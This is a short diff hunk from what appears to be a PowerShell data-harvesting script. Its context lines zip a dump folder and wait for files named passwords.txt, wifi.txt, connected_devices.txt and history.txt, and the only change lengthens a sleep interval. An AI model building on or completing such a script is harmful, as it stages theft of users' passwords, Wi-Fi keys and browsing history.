@@ -37,7 +37,7 @@ Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
 # Wait until the ZIP file is created
 while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 3
 }
 
 
